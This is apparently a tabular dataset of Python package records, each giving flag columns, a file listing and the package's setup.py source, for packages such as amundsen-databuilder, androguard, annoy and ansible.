file_system_mysql_csv_loader.py file_system_neo4j_csv_loader.py file_system_neptune_csv_loader.py generic_loader.py __init__.py application.py atlas_entity.py atlas_relationship.py atlas_serializable.py badge.py cluster_constants.py __init__.py dashboard_chart.py dashboard_execution.py dashboard_last_modified.py dashboard_metadata.py dashboard_owner.py dashboard_query.py dashboard_table.py dashboard_usage.py __init__.py dashboard_elasticsearch_document.py description_metadata.py elasticsearch_document.py es_last_updated.py feature_elasticsearch_document.py feature_generation_code.py feature_metadata.py feature_watermark.py __init__.py graph_node.py graph_relationship.py graph_serializable.py owner.py owner_constants.py base.py query.py query_execution.py query_join.py query_where.py __init__.py report.py schema.py schema_constant.py __init__.py table_column_usage.py table_elasticsearch_document.py table_last_updated.py table_lineage.py table_metadata.py table_owner.py table_serializable.py table_source.py table_stats.py timestamp_constants.py __init__.py type_metadata.py usage.py usage_constants.py __init__.py user.py user_elasticsearch_document.py watermark.py __init__.py atlas_csv_publisher.py base_publisher.py elasticsearch_constants.py elasticsearch_publisher.py mysql_csv_publisher.py neo4j_csv_publisher.py neo4j_preprocessor.py neptune_csv_publisher.py __init__.py base_rest_api_query.py mode_paginated_rest_api_query.py __init__.py query_merger.py rest_api_failure_handlers.py rest_api_query.py __init__.py atlas_serializer.py mysql_serializer.py neo4_serializer.py neptune_serializer.py __init__.py base_task.py mysql_staleness_removal_task.py neo4j_staleness_removal_task.py neptune_staleness_removal_task.py document_mappings.py search_data_queries.py search_metadata_to_elasticsearch_task.py __init__.py task.py __init__.py base_transformer.py bigquery_usage_transformer.py complex_type_transformer.py dict_to_model.py generic_transformer.py regex_str_replace_transformer.py remove_field_transformer.py table_tag_transformer.py template_variable_substitution_transformer.py timestamp_string_to_epoch.py __init__.py 00_cluster_schema.json 01_1_reader.json 01_2_table_schema.json 01_3_bookmark.json 01_4_report.json 01_column_schema.json 01_column_table_relation.json 01_database_cluster_relation.json 01_database_schema.json 01_schema_cluster_relation.json 01_schema_schema.json 01_source_schema.json 01_table_schema_relation.json 01_table_source_relation.json 02_user.json 04_reader_referenceable_relation.json 04_user_reader_relation.json 05_1_hive_table_partition.json 05_table_partition_schema.json 06_user_table_owner_relation.json 07_application_schema.json 08_lineage_schema.json 01_group.json 02_dashboard.json 03_query.json 04_chart.json 05_execution.json 06_dashboard_cluster_relation.json __init__.py __init__.py types_def.py __init__.py __init__.py atlas.py closer.py hive_complex_type_parser.py trino_complex_type_parser.py __init__.py __init__.py __init__.py MANIFEST.in PKG-INFO README.md requirements-dev.txt requirements.txt setup.cfg setup.py,"# Copyright Contributors to the Amundsen project.
# SPDX-License-Identifier: Apache-2.0

import os

from setuptools import find_packages, setup

__version__ = '7.1.2'

requirements_path = os.path.join(os.path.dirname(os.path.realpath(__file__)),
                                 'requirements.txt')
with open(requirements_path, 'r') as requirements_file:
    requirements = requirements_file.readlines()

requirements_path = os.path.join(os.path.dirname(os.path.realpath(__file__)),
                                 'requirements-dev.txt')
with open(requirements_path, 'r') as requirements_file:
    requirements_dev = requirements_file.readlines()

kafka = ['confluent-kafka==1.0.0']

cassandra = ['cassandra-driver==3.20.1']

glue = ['boto3==1.17.23']

snowflake = [
    'snowflake-connector-python',
    'snowflake-sqlalchemy'
]

athena = ['PyAthena[SQLAlchemy]>=1.0.0, <2.0.0']

# Python API client for google
# License: Apache Software License
# Upstream url: https://github.com/googleapis/google-api-python-client
bigquery = [
    'google-api-python-client>=1.6.0, <2.0.0dev',
    'google-auth-httplib2>=0.0.1',
    'google-auth>=1.16.0, <3.0.0dev'
]

jsonpath = ['jsonpath_rw==1.4.0']

db2 = [
    'ibm_db>=3.0.1',
    'ibm-db-sa-py3>=0.3.1-1'
]

dremio = [
    'pyodbc==4.0.30'
]

druid = [
    'pydruid'
]

spark = [
    'pyspark == 3.0.1'
]

neptune = [
    'amundsen-gremlin>=0.0.9',
    'Flask==1.0.2',
    'gremlinpython==3.4.3',
    'requests-aws4auth==1.1.0',
    'typing-extensions==4.0.0',
    'overrides==2.5',
    'boto3==1.17.23'
]

feast = [
    'feast==0.17.0',
    'fastapi!=0.76.*'
]

atlas = [
    'pyatlasclient>=1.1.2',
    'apache-atlas>=0.0.11'
]

oracle = [
    'cx_Oracle==8.2.1'
]

rds = [
    'sqlalchemy>=1.3.6,<1.4',
    'mysqlclient>=1.3.6,<3'
]

salesforce = [
    'simple-salesforce>=1.11.2'
]

teradata = [
    'teradatasqlalchemy==17.0.0.0'
]

all_deps = requirements + requirements_dev + kafka + cassandra + glue + snowflake + athena + \
    bigquery + jsonpath + db2 + dremio + druid + spark + feast + neptune + rds \
    + atlas + salesforce + oracle + teradata

setup(
    name='amundsen-databuilder',
    version=__version__,
    description='Amundsen Data builder',
    url='https://www.github.com/amundsen-io/amundsen/tree/main/databuilder',
    maintainer='Amundsen TSC',
    maintainer_email='amundsen-tsc@lists.lfai.foundation',
    packages=find_packages(exclude=['tests*']),
    include_package_data=True,
    dependency_links=[],
    install_requires=requirements,
    python_requires='>=3.7',
    extras_require={
        'all': all_deps,
        'dev': requirements_dev,
        'kafka': kafka,  # To use with Kafka source extractor
        'cassandra': cassandra,
        'glue': glue,
        'snowflake': snowflake,
        'athena': athena,
        'bigquery': bigquery,
        'jsonpath': jsonpath,
        'db2': db2,
        'dremio': dremio,
        'druid': druid,
        'neptune': neptune,
        'delta': spark,
        'feast': feast,
        'atlas': atlas,
        'rds': rds,
        'salesforce': salesforce,
        'oracle': oracle,
        'teradata': teradata,
    },
    classifiers=[
        'Programming Language :: Python :: 3.7',
    ],
)
",1
amundsen-rds-0.0.6,0,1,1,1,0,0,0,0,alembic.ini env.py a539c998cc1e_add_profile_url_column_to_users_table.py c194a2dc1240_initial_commit.py __init__.py __init__.py application.py badge.py base.py cluster.py column.py dashboard.py database.py schema.py table.py tag.py updated_timestamp.py user.py __init__.py py.typed __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt MANIFEST.in PKG-INFO README.md requirements.txt setup.cfg setup.py,"# Copyright Contributors to the Amundsen project.
# SPDX-License-Identifier: Apache-2.0

from setuptools import find_packages, setup

__version__ = '0.0.6'


requirements = [
    'sqlalchemy>=1.3.0,<1.4',
    'alembic>=1.2,<2.0'
]

setup(
    name='amundsen-rds',
    version=__version__,
    description='Amundsen ORM Support',
    url='https://www.github.com/amundsen-io/amundsenrds',
    maintainer='Amundsen TSC',
    maintainer_email='amundsen-tsc@lists.lfai.foundation',
    packages=find_packages(),
    dependency_links=[],
    install_requires=requirements,
    python_requires='>=3.6',
    extras_require={},
    classifiers=[
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.7',
    ],
    package_data={
        'amundsen_rds': ['py.typed', '*.ini']
    }
)
",1
analytics-python-1.4.0,0,1,1,1,1,0,0,0,client.py consumer.py request.py client.py consumer.py module.py request.py utils.py __init__.py utils.py version.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt MANIFEST.in PKG-INFO README.md setup.cfg setup.py,"import os
import sys

try:
    from setuptools import setup
except ImportError:
    from distutils.core import setup

# Don't import analytics-python module here, since deps may not be installed
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'analytics'))
from version import VERSION

long_description = '''
Segment is the simplest way to integrate analytics into your application.
One API allows you to turn on any other analytics service. No more learning
new APIs, repeated code, and wasted development time.

This is the official python client that wraps the Segment REST API (https://segment.com).

Documentation and more details at https://github.com/segmentio/analytics-python
'''

install_requires = [
    ""requests>=2.7,<3.0"",
    ""six>=1.5"",
    ""monotonic>=1.5"",
    ""backoff==1.10.0"",
    ""python-dateutil>2.1""
]

tests_require = [
    ""mock==2.0.0"",
    ""pylint==1.9.3"",
    ""flake8==3.7.9"",
]

setup(
    name='analytics-python',
    version=VERSION,
    url='https://github.com/segmentio/analytics-python',
    author='Segment',
    author_email='friends@segment.com',
    maintainer='Segment',
    maintainer_email='friends@segment.com',
    test_suite='analytics.test.all',
    packages=['analytics', 'analytics.test'],
    license='MIT License',
    install_requires=install_requires,
    extras_require={
        'test': tests_require
    },
    description='The hassle-free way to integrate analytics into any python application.',
    long_description=long_description,
    classifiers=[
        ""Development Status :: 5 - Production/Stable"",
        ""Intended Audience :: Developers"",
        ""License :: OSI Approved :: MIT License"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: Python"",
        ""Programming Language :: Python :: 2"",
        ""Programming Language :: Python :: 2.7"",
        ""Programming Language :: Python :: 3"",
        ""Programming Language :: Python :: 3.2"",
        ""Programming Language :: Python :: 3.3"",
        ""Programming Language :: Python :: 3.4"",
        ""Programming Language :: Python :: 3.5"",
        ""Programming Language :: Python :: 3.6"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
    ],
)
",1
androguard-3.3.5,0,1,1,0,1,0,1,0,androarsc.py androaxml.py androcg.py androdd.py androdis.py entry_points.py main.py __init__.py analysis.py auto.py tags.py __init__.py androconf.py permissions_10.json permissions_13.json permissions_14.json permissions_15.json permissions_16.json permissions_17.json permissions_18.json permissions_19.json permissions_21.json permissions_22.json permissions_23.json permissions_24.json permissions_25.json permissions_26.json permissions_27.json permissions_28.json permissions_4.json permissions_5.json permissions_6.json permissions_7.json permissions_8.json permissions_9.json permissions_16.json permissions_17.json permissions_18.json permissions_19.json permissions_21.json permissions_22.json permissions_23.json permissions_24.json permissions_25.json __init__.py bytecode.py apk.py types.py __init__.py dvm.py dvm_types.py mutf8.py __init__.py public.py public.xml __init__.py __init__.py basic_blocks.py control_flow.py dast.py dataflow.py decompile.py graph.py instruction.py node.py opcode_ins.py util.py writer.py __init__.py decompiler.py __init__.py androguard.ico annotation.ui apiwindow.py Banners.py BinViewMode.py binwindow.py cemu.py DataModel.py DisasmViewMode.py fileloading.py helpers.py HexViewMode.py mainwindow.py methodswindow.py renamewindow.py resourceswindow.py search.ui SourceViewMode.py sourcewindow.py stringswindow.py TextDecorators.py TextSelection.py treewindow.py ViewMode.py xrefwindow.py __init__.py misc.py session.py util.py __init__.py dependency_links.txt entry_points.txt PKG-INFO requires.txt SOURCES.txt top_level.txt androgui.py androlyze.py androsign.py PKG-INFO README.md setup.cfg setup.py,"#!/usr/bin/env python
from __future__ import print_function
import sys
from androguard import __version__

from setuptools import setup, find_packages


# We do not support python versions <2.7 and python <3.4
if (sys.version_info.major == 3 and sys.version_info.minor < 4) or (sys.version_info.major == 2 and sys.version_info.minor < 7):
    print(""Unfortunatly, your python version is not supported!\n""
          ""Please upgrade at least to python 2.7 or 3.4!"", file=sys.stderr)
    sys.exit(1)

# PyQT5 is only available for python >=3.5
if sys.version_info <= (3, 4):
    print(""PyQT5 is probably not available for your system, the GUI might not work!"", file=sys.stderr)

install_requires = ['future',
                    'networkx>=1.11',
                    'pygments',
                    'lxml',
                    'colorama',
                    'matplotlib',
                    'asn1crypto>=0.24.0',
                    'click',
                    'pydot>=1.4.1',
                    ]

# python version specific library versions:
#
# IPython Issue: For python2.x, a version <6 is required
if sys.version_info >= (3, 3):
    install_requires.append('ipython>=5.0.0')
else:
    install_requires.append('ipython>=5.0.0,<6')


# TODO add the permission mapping generation at a better place!
# from axplorer_to_androguard import generate_mappings
# generate_mappings()

setup(
    name='androguard',
    description='Androguard is a full python tool to play with Android files.',
    long_description=""""""Androguard is a tool and python library to interact with Android Files.
    
    Usually they come in the form of Android Packages (APK) or Dalvik Executeable (DEX) files.
    Androguard has tools to read Android's binary format for XML files (AXML) and is also suited with a decompiler for DEX.
    
    Androguard might not only be used as a tool for reverse engineering single applications, but features a lot of functions
    for automated analysis. It provides a pure python framework to build your own analysis tools.
    
    If you encounter bugs while using androguard, please feel free to report them in our bugtracker_.
    
    .. _bugtracker: https://github.com/androguard/androguard/issues
    """""",
    version=__version__,
    license=""Apache Licence, Version 2.0"",
    url=""https://github.com/androguard/androguard"",
    download_url=""https://github.com/androguard/androguard/releases"",
    packages=find_packages(),
    package_data={
        # add the json files, residing in the api_specific_resources package
        ""androguard.core.api_specific_resources"": [""aosp_permissions/*.json"",
                                                   ""api_permission_mappings/*.json""],
        ""androguard.core.resources"": [""public.xml""],
        # Collect also the GUI files this way
        ""androguard.gui"": [""annotation.ui"", ""search.ui"", ""androguard.ico""],
    },
    scripts=['androaxml.py',
             'androarsc.py',
             'androsign.py',
             'androdis.py',
             'androlyze.py',
             'androdd.py',
             'androgui.py',
             'androcg.py',
             ],
    entry_points={
        'console_scripts': ['androguard=androguard.cli.entry_points:entry_point']
    },
    install_requires=install_requires,
    extras_require={
        'GUI': [""pyperclip"", ""PyQt5""],
        'magic': ['python-magic>=0.4.15'],
        'docs': ['sphinx', ""sphinxcontrib-programoutput>0.8"", 'sphinx_rtd_theme'],
        'tests': ['mock>=2.0', 'nose', 'codecov', 'coverage', 'nose-timer'],
    },
    setup_requires=['setuptools'],
    classifiers=[
                 'License :: OSI Approved :: Apache Software License',
                 'Programming Language :: Python',
                 'Programming Language :: Python :: 2',
                 'Programming Language :: Python :: 2.7',
                 'Programming Language :: Python :: 3.4',
                 'Programming Language :: Python :: 3.5',
                 'Programming Language :: Python :: 3.6',
                 'Programming Language :: Python :: 3.7',
                 'Programming Language :: Python :: 3.8',
                 'Topic :: Security',
                 'Topic :: Software Development',
                 'Topic :: Utilities',
                ],

)
",1
annoy-1.17.1,0,1,1,1,1,0,0,0,ann.png py.typed __init__.py __init__.pyi dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE MANIFEST.in PKG-INFO README.rst setup.cfg setup.py annoylib.h annoymodule.cc kissrandom.h mman.h,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright (c) 2013 Spotify AB
#
# Licensed under the Apache License, Version 2.0 (the ""License""); you may not
# use this file except in compliance with the License. You may obtain a copy of
# the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
# License for the specific language governing permissions and limitations under
# the License.

from setuptools import setup, Extension
import codecs
import os
import platform
import sys

readme_note = """"""\
.. note::

   For the latest source, discussion, etc, please visit the
   `GitHub repository <https://github.com/spotify/annoy>`_\n\n

.. image:: https://img.shields.io/github/stars/spotify/annoy.svg
    :target: https://github.com/spotify/annoy

""""""

with codecs.open('README.rst', encoding='utf-8') as fobj:
    long_description = readme_note + fobj.read()

# Various platform-dependent extras
extra_compile_args = ['-D_CRT_SECURE_NO_WARNINGS', '-fpermissive']
extra_link_args = []

# Not all CPUs have march as a tuning parameter
cputune = ['-march=native',]
if platform.machine() == 'ppc64le':
    extra_compile_args += ['-mcpu=native',]

if platform.machine() == 'x86_64':
    extra_compile_args += cputune

if os.name != 'nt':
    extra_compile_args += ['-O3', '-ffast-math', '-fno-associative-math']

# Add multithreaded build flag for all platforms using Python 3 and
# for non-Windows Python 2 platforms
python_major_version = sys.version_info[0]
if python_major_version == 3 or (python_major_version == 2 and os.name != 'nt'):
    extra_compile_args += ['-DANNOYLIB_MULTITHREADED_BUILD']

    if os.name != 'nt':
        extra_compile_args += ['-std=c++14']

# #349: something with OS X Mojave causes libstd not to be found
if platform.system() == 'Darwin':
    extra_compile_args += ['-mmacosx-version-min=10.12']
    extra_link_args += ['-stdlib=libc++', '-mmacosx-version-min=10.12']

# Manual configuration, you're on your own here.
manual_compiler_args = os.environ.get('ANNOY_COMPILER_ARGS', None)
if manual_compiler_args:
    extra_compile_args = manual_compiler_args.split(',')
manual_linker_args = os.environ.get('ANNOY_LINKER_ARGS', None)
if manual_linker_args:
    extra_link_args = manual_linker_args.split(',')

setup(name='annoy',
      version='1.17.1',
      description='Approximate Nearest Neighbors in C++/Python optimized for memory usage and loading/saving to disk.',
      packages=['annoy'],
      package_data={'annoy': ['__init__.pyi', 'py.typed']},
      ext_modules=[
          Extension(
              'annoy.annoylib', ['src/annoymodule.cc'],
              depends=['src/annoylib.h', 'src/kissrandom.h', 'src/mman.h'],
              extra_compile_args=extra_compile_args,
              extra_link_args=extra_link_args,
          )
      ],
      long_description=long_description,
      author='Erik Bernhardsson',
      author_email='mail@erikbern.com',
      url='https://github.com/spotify/annoy',
      license='Apache License 2.0',
      classifiers=[
          'Development Status :: 5 - Production/Stable',
          'Programming Language :: Python',
          'Programming Language :: Python :: 2.6',
          'Programming Language :: Python :: 2.7',
          'Programming Language :: Python :: 3.3',
          'Programming Language :: Python :: 3.4',
          'Programming Language :: Python :: 3.5',
          'Programming Language :: Python :: 3.6',
          'Programming Language :: Python :: 3.7',
          'Programming Language :: Python :: 3.8',
          'Programming Language :: Python :: 3.9',
      ],
      keywords='nns, approximate nearest neighbor search',
      setup_requires=['nose>=1.0'],
      tests_require=['numpy', 'h5py']
      )
",1
ansi2html-1.8.0,0,1,1,1,1,0,0,0,.coveragerc CODEOWNERS release-drafter.yml labels.yml release-drafter.yml release.yml tox.yml .gitignore .pre-commit-config.yaml .pylintrc converter.py py.typed style.py util.py __init__.py __main__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt CHANGELOG.rst codecov.yml make.bat Makefile api.rst changelog.rst conf.py index.rst LICENSE .gitignore ansi2html.1 ansi2html.1.txt asciidoc.conf MANIFEST.in mypy.ini PKG-INFO pyproject.toml README.rst readthedocs.yml setup.cfg ansicolor.html ansicolor.txt ansicolor_eix.html ansicolor_eix.txt produce_headers.txt test_ansi2html.py tox.ini,,1
ansible-6.2.0,0,1,1,1,0,0,1,0,dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt BOTMETA.yml bug_report.yml ci_report.yml config.yml documentation_report.yml feature_request.yml patchback.yml settings.yml .gitignore bindep.txt CHANGELOG.rst changelog.yaml config.yaml .keep CONTRIBUTING.md COPYING amazon.aws.aws_account_attribute_lookup.rst amazon.aws.aws_az_info_module.rst amazon.aws.aws_caller_info_module.rst amazon.aws.aws_ec2_inventory.rst amazon.aws.aws_rds_inventory.rst amazon.aws.aws_s3_module.rst amazon.aws.aws_secret_lookup.rst amazon.aws.aws_service_ip_ranges_lookup.rst amazon.aws.aws_ssm_lookup.rst amazon.aws.cloudformation_info_module.rst amazon.aws.cloudformation_module.rst amazon.aws.ec2_ami_info_module.rst amazon.aws.ec2_ami_module.rst amazon.aws.ec2_eni_info_module.rst amazon.aws.ec2_eni_module.rst amazon.aws.ec2_group_info_module.rst amazon.aws.ec2_group_module.rst amazon.aws.ec2_instance_info_module.rst amazon.aws.ec2_instance_module.rst amazon.aws.ec2_key_module.rst amazon.aws.ec2_metadata_facts_module.rst amazon.aws.ec2_module.rst amazon.aws.ec2_snapshot_info_module.rst amazon.aws.ec2_snapshot_module.rst amazon.aws.ec2_spot_instance_info_module.rst amazon.aws.ec2_spot_instance_module.rst amazon.aws.ec2_tag_info_module.rst amazon.aws.ec2_tag_module.rst amazon.aws.ec2_vol_info_module.rst amazon.aws.ec2_vol_module.rst amazon.aws.ec2_vpc_dhcp_option_info_module.rst amazon.aws.ec2_vpc_dhcp_option_module.rst amazon.aws.ec2_vpc_endpoint_info_module.rst amazon.aws.ec2_vpc_endpoint_module.rst amazon.aws.ec2_vpc_endpoint_service_info_module.rs amazon.aws.ec2_vpc_igw_info_module.rst amazon.aws.ec2_vpc_igw_module.rst amazon.aws.ec2_vpc_nat_gateway_info_module.rst amazon.aws.ec2_vpc_nat_gateway_module.rst amazon.aws.ec2_vpc_net_info_module.rst amazon.aws.ec2_vpc_net_module.rst amazon.aws.ec2_vpc_route_table_info_module.rst amazon.aws.ec2_vpc_route_table_module.rst amazon.aws.ec2_vpc_subnet_info_module.rst amazon.aws.ec2_vpc_subnet_module.rst amazon.aws.elb_classic_lb_module.rst amazon.aws.s3_bucket_module.rst extra-docs.yml dev_guidelines.rst guide_aws.rst FILES.json MANIFEST.json runtime.yml aws_s3.py __init__.py aws_resource_actions.py __init__.py aws.py aws_boto3.py aws_credentials.py aws_region.py ec2.py tags.py __init__.py aws_ec2.py aws_rds.py __init__.py aws_account_attribute.py aws_secret.py aws_service_ip_ranges.py aws_ssm.py __init__.py aws_az_facts.py aws_az_info.py aws_caller_info.py aws_s3.py cloudformation.py cloudformation_info.py ec2.py ec2_ami.py ec2_ami_info.py ec2_eni.py ec2_eni_info.py ec2_group.py ec2_group_info.py ec2_instance.py ec2_instance_info.py ec2_key.py ec2_metadata_facts.py ec2_snapshot.py ec2_snapshot_info.py ec2_spot_instance.py ec2_spot_instance_info.py ec2_tag.py ec2_tag_info.py ec2_vol.py ec2_vol_info.py ec2_vpc_dhcp_option.py ec2_vpc_dhcp_option_info.py ec2_vpc_endpoint.py ec2_vpc_endpoint_info.py ec2_vpc_endpoint_service_info.py ec2_vpc_igw.py ec2_vpc_igw_info.py ec2_vpc_nat_gateway.py ec2_vpc_nat_gateway_info.py ec2_vpc_net.py ec2_vpc_net_info.py ec2_vpc_route_table.py ec2_vpc_route_table_info.py ec2_vpc_subnet.py ec2_vpc_subnet_info.py elb_classic_lb.py s3_bucket.py __init__.py acm.py batch.py cloud.py cloudfront_facts.py core.py direct_connect.py ec2.py elbv2.py elb_utils.py iam.py policy.py rds.py s3.py tagging.py urls.py version.py waf.py waiters.py _version.py __init__.py __init__.py PSF-license.txt README.md requirements.txt test-requirements.txt .gitignore config.yml constraints.txt requirements.txt aliases main.yml main.yml main.yml aliases main.ya aliases main.yml hello.txt test.png main.yml copy_object.yml delete_bucket.ym main.yml policy.json. put-template aliases main. cf_templ update_p main.yml main.yml aliases main.yml main.yml main.yml aliases main.yml main.yml main.yml main.yml aliases main.yml main.yml main.yaml test_attachment test_deletion.y test_eni_basic_ test_ipaddress_ test_modifying_ aliases main.yml main.yml data_validati diff_mode.yml ec2_classic.y egress_tests. group_info.ym ipv6_default_ main.yml multi_account multi_nested_ numeric_proto rule_group_cr aliases inventory main.yml main.yml runme.sh aliases main.yml main.yml main.yml aliases main. CHANGELOG-v6.rst COPYING MANIFEST.in PKG-INFO README.rst,"# Copyright Red Hat, Inc. All Rights Reserved.
# GNU General Public License v3.0+ (see COPYING or https://www.gnu.org/licenses/gpl-3.0.txt)

import setuptools

setuptools.setup(
    setup_requires=['pbr'],
    pbr=True)
",1
ansible-base-2.10.17,1,1,1,1,0,0,1,0,ansible ansible-config ansible-connection ansible-console ansible-doc ansible-galaxy ansible-inventory ansible-playbook ansible-pull ansible-vault CHANGELOG-v2.10.rst CHANGELOG.rst changelog.yaml COPYING find-plugin-refs.py testing_formatter.sh .gitignore .nojekyll ansible_2_10.inv ansible_2_5.inv ansible_2_6.inv ansible_2_7.inv ansible_2_8.inv ansible_2_9.inv ansible_3.inv collection-plugins.yml jinja2.inv application.js keyword_desc.yml Makefile Makefile.sphinx modules.js python2.inv python3.inv README.md requirements.txt 2.10_index.rst 404.rst ansible_index.rst index.rst all_plugins.rst code_of_conduct.rst committer_guidelines.rst communication.rst community.rst contributing_maintained_collections.rst contributor_license_agreement.rst development_process.rst documentation_contributions.rst github_admins.rst how_can_I_help.rst index.rst maintainers.rst other_tools_and_programs.rst release_managers.rst reporting_bugs_and_features.rst triage_process.rst core_index.rst debugging.rst developing_api.rst developing_collections.rst developing_core.rst developing_inventory.rst developing_locally.rst developing_modules.rst developing_modules_best_practices.rst developing_modules_checklist.rst developing_modules_documenting.rst developing_modules_general.rst developing_modules_general_aci.rst developing_modules_general_windows.rst developing_modules_in_groups.rst developing_module_utilities.rst developing_plugins.rst developing_program_flow_modules.rst developing_python_3.rst developing_rebasing.rst index.rst migrating_roles.rst module_lifecycle.rst overview_architecture.rst aws_guidelines.rst openstack_guidelines.rst ovirt_dev_guide.rst vmware_guidelines.rst licensing.txt basic_rules.rst grammar_punctuation.rst commas-matter-2.jpg commas-matter.jpg hyphen-funny.jpg thenvsthan.jpg index.rst resources.rst search_hints.rst spelling_word_choice.rst trademarks.rst voice_style.rst why_use.rst action-plugin-docs.rst ansible-doc.rst ansible-var-precedence-check.rst azure-requirements.rst bin-symlinks.rst boilerplate.rst botmeta.rst changelog.rst compile.rst configure-remoting-ps1.rst deprecated-config.rst docs-build.rst empty-init.rst future-import-boilerplate.rst ignores.rst import.rst integration-aliases.rst line-endings.rst metaclass-boilerplate.rst no-assert.rst no-basestring.rst no-dict-iteritems.rst no-dict-iterkeys.rst no-dict-itervalues.rst no-get-exception.rst no-illegal-filenames.rst no-main-display.rst no-smart-quotes.rst no-tests-as-filters.rst no-underscore-variable.rst no-unicode-literals.rst no-unwanted-files.rst no-wildcard-import.rst obsolete-files.rst package-data.rst pep8.rst pslint.rst pylint-ansible-test.rst pylint.rst release-names.rst replace-urlopen.rst required-and-default-attributes.rst rstcheck.rst runtime-metadata.rst sanity-docs.rst shebang.rst shellcheck.rst symlinks.rst test-constraints.rst update-bundled.rst use-argspec-type-path.rst use-compat-six.rst validate-modules.rst yamllint.rst testing.rst testing_compile.rst testing_documentation.rst testing_httptester.rst testing_integration.rst testing_integration_legacy.rst testing_pep8.rst testing_running_locally.rst testing_sanity.rst testing_units.rst testing_units_modules.rst testing_validate-modules.rst dev_guide.rst user_guide.rst cow.png index.rst intro_configuration.rst intro_installation.rst implicit_localhost.rst developing_plugins_network.rst developing_resource_modules_network.rst documenting_modules_network.rst index.rst basic_concepts.rst first_inventory.rst first_playbook.rst index.rst intermediate_concepts.rst network_connection_options.rst network_differences.rst network_resources.rst network_roles.rst first_playbook.yml first_playbook_ext.yml index.rst cli_parsing.rst faq.rst index.rst network_best_practices_2.5.rst network_debug_troubleshooting.rst network_resource_modules.rst network_working_with_command_output.rst platform_ce.rst platform_cnos.rst platform_dellos10.rst platform_dellos6.rst platform_dellos9.rst platform_enos.rst platform_eos.rst platform_eric_eccli.rst platform_exos.rst platform_frr.rst platform_icx.rst platform_index.rst platform_ios.rst platform_iosxr.rst platform_ironware.rst platform_junos.rst platform_meraki.rst platform_netconf_enabled.rst platform_netvisor.rst platform_nos.rst platform_nxos.rst platform_routeros.rst platform_slxos.rst platform_voss.rst platform_vyos.rst SSH_warning.txt action.rst become.rst cache.rst callback.rst cliconf.rst connection.rst httpapi.rst index.html inventory.rst lookup.rst netconf.rst plugins.rst shell.rst strategy.rst vars.rst core_porting_guides.rst porting_guides.rst porting_guide_2.0.rst porting_guide_2.10.rst porting_guide_2.3.rst porting_guide_2.4.rst porting_guide_2.5.rst porting_guide_2.6.rst porting_guide_2.7.rst porting_guide_2.8.rst porting_guide_2.9.rst porting_guide_base_2.10.rst .rstcheck.cfg automationhub.rst common_return_values.rst faq.rst general_precedence.rst glossary.rst interpreter_discovery.rst logging.rst module_utils.rst python_3_support.rst release_and_maintenance.rst special_variables.rst test_strategies.rst tower.rst YAMLSyntax.rst ansible_base_roadmap_index.rst ansible_roadmap_index.rst COLLECTIONS_2_10.rst COLLECTIONS_3_0.rst index.rst old_roadmap_index.rst ROADMAP_2_10.rst ROADMAP_2_5.rst ROADMAP_2_6.rst ROADMAP_2_7.rst ROADMAP_2_8.rst ROADMAP_2_9.rst cloud_guides.rst guides.rst guide_aci.rst guide_alicloud.rst guide_aws.rst guide_azure.rst guide_cloudstack.rst guide_docker.rst guide_gce.rst guide_infoblox.rst guide_kubernetes.rst guide_meraki.rst guide_online.rst guide_oracle.rst guide_packet.rst guide_rax.rst guide_scaleway.rst guide_vagrant.rst guide_vmware.rst guide_vultr.rst network_guides.rst scenario_template.rst virt_guides.rst faq.rst scenario_clone_template.rst scenario_find_vm_folder.rst scenario_remove_vm.rst scenario_rename_vm.rst scenario_vmware_http.rst vmware_concepts.rst vmware_external_doc_links.rst vmware_getting_started.rst vmware_intro.rst vmware_inventory.rst vmware_inventory_filters.rst vmware_inventory_hostnames.rs vmware_inventory_vm_attribute vmware_module_reference.rst vmware_requirements.rst vmware_scenarios.rst vmware_troubleshooting.rst basic_concepts.txt download_tarball_collections.txt galaxy_server_list.txt installing_collections.txt installing_collections_git_repo.txt installing_multiple_collections.txt installing_older_collection.txt basic_concepts.rst become.rst collections_using.rst command_line_tools.rst complex_data_manipulation.rst connection_details.rst guide_rolling_upgrade.rst index.rst intro.rst intro_adhoc.rst intro_bsd.rst intro_dynamic_inventory.rst intro_getting_started.rst intro_inventory.rst intro_patterns.rst intro_windows.rst modules.rst modules_intro.rst modules_support.rst playbooks.rst playbooks_advanced_syntax.rst playbooks_async.rst playbooks_best_practices.rst playbooks_blocks.rst playbooks_checkmode.rst playbooks_conditionals.rst playbooks_debugger.rst playbooks_delegation.rst playbooks_environment.rst playbooks_error_handling.rst playbooks_filters.rst playbooks_filters_ipaddr.rst playbooks_handlers.rst playbooks_intro.rst playbooks_lookups.rst playbooks_loops.rst playbooks_module_defaults.rst playbooks_prompts.rst playbooks_python_version.rst playbooks_reuse.rst playbooks_reuse_includes.rst playbooks_reuse_roles.rst playbooks_roles.rst playbooks_special_topics.rst playbooks_startnstep.rst playbooks_strategies.rst playbooks_tags.rst playbooks_templating.rst playbooks_tests.rst playbooks_variables.rst playbooks_vars_facts.rst playbooks_vault.rst playbook_pathing.rst plugin_filtering_config.rst quickstart.rst sample_setup.rst SSH_password_prompt.txt with2loop.txt vault.rst windows.rst windows_dsc.rst windows_faq.rst windows_performance.rst windows_setup.rst windows_usage.rst windows_winrm.rst 2.10_conf.py ansible_conf.py core_conf.py variables.dot pygments_lexer.py ansible.css core.css pygments.css ansible_banner.html ansible_eol_banner.html ansible_extrabody.html ansible_extrafooter.html ansible_extrahead.html ansible_extranav.html ansible_searchbox.html ansible_versions.html breadcrumbs.html footer.html layout.html search.html searchbox.html badge_only.css theme.css fontawesome-webfont.eot fontawesome-webfont.svg fontawesome-webfont.ttf fontawesome-webfont.woff fontawesome-webfont.woff2 FontAwesome.otf logo_invert.png modernizr.min.js theme.js theme.conf versions.html 